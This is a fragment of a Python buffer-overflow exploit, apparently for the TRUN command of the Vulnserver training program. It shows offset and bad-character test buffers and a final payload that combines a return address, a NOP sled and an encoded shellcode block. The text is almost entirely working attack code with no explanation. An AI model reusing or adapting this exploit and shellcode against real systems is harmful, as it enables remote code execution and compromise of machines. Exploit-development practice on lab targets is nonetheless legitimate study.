...
buffer = "TRUN /.:/" + "A" *2003 + "B"*4 + "C"*(5000-2003-4)
...
buffer = "TRUN /.:/" + "A" *2003 + "B"*4 +badchars+ "C"*(5000-2003-4-len(badchars))

buf =  b""
buf += b"\xba\x9d\x2d\x7e\x9c\xda\xdd\xd9\x74\x24\xf4\x5f"
buf += b"\x2b\xc9\xb1\x52\x83\xef\xfc\x31\x57\x0e\x03\xca"
buf += b"\x23\x9c\x69\x08\xd3\xe2\x92\xf0\x24\x83\x1b\x15"
buf += b"\x15\x83\x78\x5e\x06\x33\x0a\x32\xab\xb8\x5e\xa6"
buf += b"\x38\xcc\x76\xc9\x89\x7b\xa1\xe4\x0a\xd7\x91\x67"
buf += b"\x89\x2a\xc6\x47\xb0\xe4\x1b\x86\xf5\x19\xd1\xda"
buf += b"\xae\x56\x44\xca\xdb\x23\x55\x61\x97\xa2\xdd\x96"
buf += b"\x60\xc4\xcc\x09\xfa\x9f\xce\xa8\x2f\x94\x46\xb2"
buf += b"\x2c\x91\x11\x49\x86\x6d\xa0\x9b\xd6\x8e\x0f\xe2"
buf += b"\xd6\x7c\x51\x23\xd0\x9e\x24\x5d\x22\x22\x3f\x9a"
buf += b"\x58\xf8\xca\x38\xfa\x8b\x6d\xe4\xfa\x58\xeb\x6f"
buf += b"\xf0\x15\x7f\x37\x15\xab\xac\x4c\x21\x20\x53\x82"
buf += b"\xa3\x72\x70\x06\xef\x21\x19\x1f\x55\x87\x26\x7f"
buf += b"\x36\x78\x83\xf4\xdb\x6d\xbe\x57\xb4\x42\xf3\x67"
buf += b"\x44\xcd\x84\x14\x76\x52\x3f\xb2\x3a\x1b\x99\x45"
buf += b"\x3c\x36\x5d\xd9\xc3\xb9\x9e\xf0\x07\xed\xce\x6a"
buf += b"\xa1\x8e\x84\x6a\x4e\x5b\x0a\x3a\xe0\x34\xeb\xea"
buf += b"\x40\xe5\x83\xe0\x4e\xda\xb4\x0b\x85\x73\x5e\xf6"
buf += b"\x4e\xbc\x37\xea\x0b\x54\x4a\x0a\x05\xf9\xc3\xec"
buf += b"\x4f\x11\x82\xa7\xe7\x88\x8f\x33\x99\x55\x1a\x3e"
buf += b"\x99\xde\xa9\xbf\x54\x17\xc7\xd3\x01\xd7\x92\x89"
buf += b"\x84\xe8\x08\xa5\x4b\x7a\xd7\x35\x05\x67\x40\x62"
buf += b"\x42\x59\x99\xe6\x7e\xc0\x33\x14\x83\x94\x7c\x9c"
buf += b"\x58\x65\x82\x1d\x2c\xd1\xa0\x0d\xe8\xda\xec\x79"
buf += b"\xa4\x8c\xba\xd7\x02\x67\x0d\x81\xdc\xd4\xc7\x45"
buf += b"\x98\x16\xd8\x13\xa5\x72\xae\xfb\x14\x2b\xf7\x04"
buf += b"\x98\xbb\xff\x7d\xc4\x5b\xff\x54\x4c\x6b\x4a\xf4"
buf += b"\xe5\xe4\x13\x6d\xb4\x68\xa4\x58\xfb\x94\x27\x68"
buf += b"\x84\x62\x37\x19\x81\x2f\xff\xf2\xfb\x20\x6a\xf4"
buf += b"\xa8\x41\xbf"

buffer = "TRUN /.:/" + "A" *2003 + "\xaf\x11\x50\x62" + "\x90"*10 + buf
